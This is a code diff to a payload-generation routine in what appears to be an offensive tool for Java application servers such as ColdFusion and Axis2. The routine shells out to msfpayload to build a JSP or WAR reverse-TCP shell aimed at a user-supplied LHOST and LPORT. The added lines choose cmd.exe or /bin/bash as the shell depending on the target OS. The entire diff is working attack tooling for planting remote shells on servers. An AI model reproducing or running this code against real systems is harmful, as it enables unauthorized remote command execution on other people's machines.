@@ -14,9 +14,13 @@ def run(options):
     """
 
     PAYLOAD = "java/jsp_shell_reverse_tcp"
+    SHELL = "cmd.exe"
 
     if not options.remote_service:
         utility.Msg("Please specify a remote service (-a)", LOG.ERROR)
+        return
+    elif not options.remote_os:
+        utility.Msg("Please specify a remote OS (-o)", LOG.ERROR)
         return
     elif options.remote_service in ["coldfusion"]:
         out = "R > shell.jsp"
@@ -26,6 +30,9 @@ def run(options):
     else:
         out = "W > shell.war"
 
+    if options.remote_os != "windows":
+        SHELL = "/bin/bash"
+
     if getoutput("which msfpayload") == "":
         utility.Msg("This option requires msfpayload", LOG.ERROR)
         return
@@ -33,8 +40,8 @@ def run(options):
     utility.Msg("Generating payload....")
     (lhost, lport) = options.generate_payload.split(":")
 
-    resp = getoutput("msfpayload %s LHOST=%s LPORT=%s %s" %
-                    (PAYLOAD, lhost, lport, out))
+    resp = getoutput("msfpayload %s LHOST=%s LPORT=%s SHELL=%s %s" %
+                    (PAYLOAD, lhost, lport, SHELL, out))
 
     '''For axis2 payloads, we have to add a few things to the msfpayload output'''
     if(options.remote_service in ["axis2"]):
